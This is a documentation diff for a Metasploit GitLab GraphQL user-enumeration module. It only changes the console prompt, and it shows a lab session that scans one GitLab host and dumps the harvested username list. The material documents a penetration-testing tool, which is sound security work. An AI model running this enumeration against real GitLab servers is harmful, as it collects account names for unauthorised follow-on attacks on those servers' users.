@@ -50,21 +50,21 @@ of a [relative URL](https://docs.gitlab.com/omnibus/settings/configuration.html#
 ### GitLab 14.4.1 on Ubuntu 20.04.2 x64. More than 100 users triggers paging logic.
 
 ```
-msf6 > use auxiliary/scanner/http/gitlab_graphql_user_enum
-msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > set RHOST 10.0.0.13
+msf > use auxiliary/scanner/http/gitlab_graphql_user_enum
+msf auxiliary(scanner/http/gitlab_graphql_user_enum) > set RHOST 10.0.0.13
 RHOST => 10.0.0.13
-msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > set RPORT 80
+msf auxiliary(scanner/http/gitlab_graphql_user_enum) > set RPORT 80
 RPORT => 80
-msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > set SSL false
+msf auxiliary(scanner/http/gitlab_graphql_user_enum) > set SSL false
 [!] Changing the SSL option's value may require changing RPORT!
 SSL => false
-msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > run
+msf auxiliary(scanner/http/gitlab_graphql_user_enum) > run
 
 [+] Enumerated 142 GitLab users
 [+] Userlist stored at /home/albinolobster/.msf4/loot/20220311065704_default_10.0.0.13_gitlab.users_704600.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > cat /home/albinolobster/.msf4/loot/20220311065704_default_10.0.0.13_gitlab.users_704600.txt
+msf auxiliary(scanner/http/gitlab_graphql_user_enum) > cat /home/albinolobster/.msf4/loot/20220311065704_default_10.0.0.13_gitlab.users_704600.txt
 [*] exec: cat /home/albinolobster/.msf4/loot/20220311065704_default_10.0.0.13_gitlab.users_704600.txt
 
 test150
@@ -209,5 +209,5 @@ test
 support-bot
 alert-bot
 root
-msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > 
+msf auxiliary(scanner/http/gitlab_graphql_user_enum) > 
 ```
